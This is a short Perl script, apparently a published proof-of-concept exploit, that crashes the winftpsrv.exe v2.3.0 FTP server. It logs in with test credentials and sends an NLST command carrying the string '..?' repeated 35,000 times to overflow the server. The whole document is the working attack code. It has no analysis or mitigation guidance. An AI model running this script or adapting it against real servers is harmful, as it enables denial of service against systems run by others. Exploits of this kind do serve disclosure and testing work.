#!/usr/bin/perl
############
#
# Simple Dos Crap for the winftpsrv.exe v.2.3.0
#  by Julien Bedard
#
####################################

use Net::FTP;
$wftpsrvaddr = "ftp.example.com";
$overflow = "..?" x 35000;
$user = "test";
$pass = "test";
$port = 21;

$ftp = Net::FTP->new("$wftpsrvaddr", Debug => 0) || die "Cannot connect to ftp server: $@";
$ftp->login($user,$pass) || die "Cannot login ", $ftp->message;

$ftp->nlst($overflow);
$ftp->quit;
